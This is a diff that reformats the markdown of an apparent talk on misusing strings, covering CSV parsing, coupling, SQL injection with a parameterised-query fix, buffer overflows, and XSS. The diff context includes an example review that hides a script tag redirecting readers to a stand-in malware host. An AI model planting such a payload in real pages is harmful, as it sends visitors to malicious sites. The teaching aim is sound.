@@ -32,7 +32,7 @@ But first…
 
 <section>
 
-### What exactly *is* a string?
+### What exactly _is_ a string?
 
 <div class="notes">
 
@@ -310,6 +310,7 @@ public class Toolboxen {
     }
 }
 ```
+
 </section>
 
 <section>
@@ -387,9 +388,9 @@ UGH.
 
 Now, we're still missing a lot.
 
-  * You need to be able to escape the quote character, because sometimes you'll need it inside a string.
-  * Quoted fields can span multiple lines.
-  * Every row should contain the same number of comma-separated fields.
+- You need to be able to escape the quote character, because sometimes you'll need it inside a string.
+- Quoted fields can span multiple lines.
+- Every row should contain the same number of comma-separated fields.
 
 But here's the real problem. There's tight coupling between reading the file and creating our `Toolbox` objects. We can remedy that by returning a stream and letting the caller construct the object:
 
@@ -551,7 +552,7 @@ In most databases, `--` marks the start of a comment, which continues until the 
 
 <div class="notes">
 
-Yup. Turns out that username will get you into a lot of badly-written websites. And it's easy to test for. On the *really* broken ones, using `'` in your username or password will crash the website.
+Yup. Turns out that username will get you into a lot of badly-written websites. And it's easy to test for. On the _really_ broken ones, using `'` in your username or password will crash the website.
 
 The correct way to do things is to, of course, use parameterised SQL:
 
@@ -578,7 +579,7 @@ public boolean authenticate(String username, String password) {
 
 This way, the database will handle the user-supplied input separately from the SQL itself, which means (assuming the database driver has been written well) any SQL in the user input will be treated as text, not code.
 
-A number of threats to security involve convincing a program to treat data as executable instructions. Most of the attacks on Microsoft and Oracle which mean you have to update Windows and Java every seventeen minutes buffer overflow attacks. Because arrays aren't really a thing in C, you can *overflow* the array by simply writing past the end of it; there are no checks to ensure user input fits inside the array. If you are familiar with the memory layout of the application, you can write enough that you overwrite machine instructions with your own, giving you complete control of the application execution simply by providing more text than was expected.
+A number of threats to security involve convincing a program to treat data as executable instructions. Most of the attacks on Microsoft and Oracle which mean you have to update Windows and Java every seventeen minutes buffer overflow attacks. Because arrays aren't really a thing in C, you can _overflow_ the array by simply writing past the end of it; there are no checks to ensure user input fits inside the array. If you are familiar with the memory layout of the application, you can write enough that you overwrite machine instructions with your own, giving you complete control of the application execution simply by providing more text than was expected.
 
 </div>
 
@@ -627,7 +628,7 @@ Except no. What if one of the reviews looks something like this?
 </div>
 
 > I thought this was one of Shakespeare's best plays.
-  &lt;script&gt;document.location = 'http://install.malware.com/';&lt;/script&gt;
+> &lt;script&gt;document.location = 'http://install.malware.com/';&lt;/script&gt;
 
 <div class="notes">
 
@@ -822,9 +823,9 @@ Strings are the most powerful tool we have in our programming languages. Like al
 
 <div class="notes">
 
-Misuse of strings can lead to bad software design, such as *coupling* infrastructure to business logic, which can make your code hard to extend, maintain, support and test. I'd argue that strings are actually an infrastructure-level concern, and that any code related to your core logic shouldn't touch them at all.
+Misuse of strings can lead to bad software design, such as _coupling_ infrastructure to business logic, which can make your code hard to extend, maintain, support and test. I'd argue that strings are actually an infrastructure-level concern, and that any code related to your core logic shouldn't touch them at all.
 
-Perhaps more importantly, strings stop us from guaranteeing *correctness*. Types are scary to some people, but strong wrappers for your data are important, because they stop us from creating massive security vulnerabilities. Munging HTML or SQL together by concatenating strings is convenient, but offers nothing in the way of security. Only by dealing with data as data and code as code can we avoid this.
+Perhaps more importantly, strings stop us from guaranteeing _correctness_. Types are scary to some people, but strong wrappers for your data are important, because they stop us from creating massive security vulnerabilities. Munging HTML or SQL together by concatenating strings is convenient, but offers nothing in the way of security. Only by dealing with data as data and code as code can we avoid this.
 
 </div>
 
